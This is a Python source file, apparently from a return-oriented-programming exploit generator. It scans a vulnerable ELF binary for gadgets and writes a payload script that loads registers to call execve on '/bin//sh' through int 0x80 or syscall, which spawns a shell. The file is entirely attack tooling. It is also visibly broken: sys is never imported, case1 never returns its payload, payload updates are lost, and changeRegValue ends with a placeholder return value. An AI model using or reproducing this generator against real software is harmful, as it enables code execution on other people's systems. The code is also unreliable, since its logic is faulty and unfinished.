#!/usr/bin/python3

from elftools.elf.elffile import ELFFile
import capstone
import struct

import general
import print_pretty
import categorize



# This file has routines which will get ROPChains for different exploit functions. 

payload = bytes()


# Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
def execveROPChain(GadgetList, vulnExecutable): 

    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)
    
    # We need .data section's details because we have to write "/bin//sh" into it. 
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    intList = categorize.checkIfIntPresent(GadgetList)

    if len(intList) == 0 and len(syscallList) == 0: 
        print("No int 0x80, no syscall, no ROP")
        print("Exiting tool :(")
        sys.exit()
    
    # This is what we have to do: 
    
    # if int 0x80 is found, 
        # rax <- 11
        # rbx <- Address of "/bin/sh"
        # rcx <- 0
        # rdx <- 0
        # int 0x80
    
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    

    # Always choose int 0x80 over syscall if int 0x80 is present because registers used are common ones and eax should be set to 11. 

    # Will always go for int 0x80(if present) because rax should be incremented only 11 times for execve()
    elif len(intList) > 0 : 
        payload = case1(GadgetList)
        return payload
    
    if len(syscallList) > 0: 
        payload = case1(GadgetList)
        return payload
    
    print("If this is getting printed, it means there are no special instructions found. So, you know what this means!")


def canWrite(movQwordGadgets, popGadgets):
    for gadget in movQwordGadgets:
        ops = gadget[-2]['operands']
        op1 = ops[0][-4:-1]
        op2 = ops[1]
        f1 = 0
        f2 = 0
        for popGadg in popGadgets:
            if popGadg[0]['operands'][0] == op1:
                f1 =1
                break
        for popGadg in popGadgets:
            if popGadg[0]['operands'][0] == op2:
                f2 =1
                break
        if(f1 and f2):
            return [op1,op2]
    return list()
# If int 0x80 is present.
def case1(GadgetList) : 

    payload = bytes()
    fd = open("execveChain.py", "w")
    writeHeader(fd)

    raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")

    print_pretty.print_pretty(raxList)

    # rax <- 11
    x = 0
    while x < len(raxList) : 

        gadget = raxList[x]
        inst = gadget[0]

        if inst.mnemonic == "pop" : 
                
            # "pop rax; ret" found. 
            # Steps to be taken: 
                # Put 11 in the payload
                # Execute "pop rax; ret"
               
            # Update payload
            payload += struct.pack("<Q", 11)
            payload += struct.pack("<Q", int(inst.address))
                

            # Write it into the file
            fd.write("payload += struct.pack('<Q', 11)")
            fd.write("\n\t")
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst.address)))
            fd.write(")")
            fd.write("\n\t")
            break
  
        if inst.mnemonic == "xor" : 

            # "xor rax, rax; ret" found
            # Jackpot!
            # Steps to do: 
                # Execute "xor rax, rax; ret"
                # Find for arithmetic gadgets which will increase rax's value to 11

            # Update payload
            payload += struct.pack("<Q", int(inst.address))

            # Write it into the file
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst.address)))
            fd.write(")")
            fd.write("\n\t")

            if changeRegValue(GadgetList, "rax", 0, 11, payload, fd) == 0: 
                print("Unable to find gadgets which can change rax's value")
                print("Exiting...")
                sys.exit()

        # Keep the loop going!
        x = x + 1

    # rcx <- 0
    rcxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rcx")
    x = 0
    while(x < len(rcxList)):
        gadget = rcxList[x]
        inst = gadget[0]
        if inst.mnemonic == "pop" :
            # "pop rcx; ret" found. 
            # Steps to be taken: 
                # Put 0 in the payload
                # Execute "pop rax; ret"
               
            # Update payload
            payload += struct.pack("<Q", 0)
            payload += struct.pack("<Q", int(inst.address))
                

            # Write it into the file
            fd.write("payload += struct.pack('<Q', 0)")
            fd.write("\n\t")
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst.address)))
            fd.write(")")
            fd.write("\n\t")
            break
        x = x + 1

    # rdx <- 0
    rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
    x = 0

    while(x < len(rdxList)):
        gadget = rdxList[x]
        inst = gadget[0]
        if inst.mnemonic == "pop" :
            # "pop rcx; ret" found. 
            # Steps to be taken: 
                # Put 0 in the payload
                # Execute "pop rax; ret"
               
            # Update payload
            payload += struct.pack("<Q", 0)
            payload += struct.pack("<Q", int(inst.address))
                

            # Write it into the file
            fd.write("payload += struct.pack('<Q', 0)")
            fd.write("\n\t")
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst.address)))
            fd.write(")")
            fd.write("\n\t")
            break
        x = x + 1





def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) : 

    print("Inside changeRegValue")

    RegArithList = categorize.queryGadgets(GadgetList, general.ARITHMETICG, Reg)
    # print_pretty.print_pretty(RegArithList)

    # A variable 
    const = 0
    X = 0
    while X < len(RegArithList) : 

        gadget = RegArithList[X]
        inst = gadget[0]
        print("Inst = ", inst.mnemonic)

        if inst.mnemonic == "inc" : 
            
            if FinalValue > CurrentValue : 
                
                counter = 0
                while counter < (FinalValue - CurrentValue) : 
                    
                    # Execute "inc Reg; ret"

                    # Update payload
                    payload += struct.pack("<Q", int(inst.address))

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst.address)))
                    fd.write(")")
                    fd.write("\n\t")

                    counter = counter + 1

            return 1

        if inst.mnemonic == "dec" : 

            if FinalValue < CurrentValue : 

                counter = 0
                while counter < (CurrentValue - FinalValue) : 

                    # Execute "dec Reg; ret"

                    # Update payload
                    payload += struct.pack("<Q", int(inst.address))

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst.address)))
                    fd.write(")")
                    fd.write("\n\t")

                    counter = counter + 1
            
            return 1
        
        if inst.mnemonic == "add" : 
            
            print("Found add")
            operands = inst.op_str.split(',')
            
            
            operands = categorize.getStrippedOperands(operands)
            print("operands = ", operands)

            if operands[1].isnumeric() : 
                const = int(operands[1])

            if const == 1 and FinalValue > CurrentValue : 

                counter = 0
                while counter < (FinalValue - CurrentValue) : 

                    # execute "add Reg, 1; ret"

                    # Update payload
                    payload += struct.pack("<Q", int(inst.address))

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst.address)))
                    fd.write(")")
                    fd.write("\n\t")

                    counter = counter + 1
                
                return 1

            if const > 1 and FinalValue > CurrentValue :
                
                gap = FinalValue - CurrentValue
                quo = gap / const
                rem = gap % const

                while quo > 0 : 

                    # execute add Reg, const; ret"

                    # Update payload
                    payload += struct.pack("<Q", int(inst.address))

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst.address)))
                    fd.write(")")
                    fd.write("\n\t")
                    
                    quo = quo - 1

                    CurrentValue = CurrentValue + const

                if FinalValue == CurrentValue: 
                    return 1

                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
                    print("Unable to find gadgets which can change rax's value")
                    print("Exiting...")
                    sys.exit()
                
                else : 
                    return 1

            if const == -1 and FinalValue < CurrentValue: 
                
                counter = 0
                while counter < CurrentValue - FinalValue : 

                    # execute "add Reg, -1; ret"

                    # Update payload
                    payload += struct.pack("<Q", int(inst.address))

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst.address)))
                    fd.write(")")
                    fd.write("\n\t")
                    
                    counter = counter + 1
                
                return 1
            
            if const < -1 and FinalValue < CurrentValue : 
    
                gap = CurrentValue - FinalValue
                quo = gap / (-(const))
                    
                while quo > 0: 

                    # execute "add Reg, -ve number; ret"

                    # Update payload
                    payload += struct.pack("<Q", int(inst.address))

                    # Write into file
                    fd.write("payload += struct.pack('<Q', ")
                    fd.write(hex(int(inst.address)))
                    fd.write(")")
                    fd.write("\n\t")
                            
                    quo = quo - 1

                    CurrentValue = CurrentValue + const
                
                if FinalValue == CurrentValue : 
                    return 1
                
                if changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) == 0: 
                    print("Unable to find gadgets which can change rax's value")
                    print("Exiting...")
                    sys.exit()
                
                else : 
                    return 1
            
        # TODO: Do the same for sub instruction
        # Take care of recursive calls properly.

        # main while loop
        # Keep it going!
        X = X + 1


    return ("qwwe", "123")


def writeHeader(fd) : 

    fd.write("#!/usr/bin/env python3")
    fd.write("\n\n")
    fd.write("import struct")
    fd.write("\n\n")
    fd.write("if __name__ == '__main__' : ")
    fd.write("\n\n\t")
    fd.write("# Enter the amount of junk required")
    fd.write("\n\t")
    fd.write("\tpayload = ''")
    fd.write("\n\n\t")

    








        
    
    
    
    
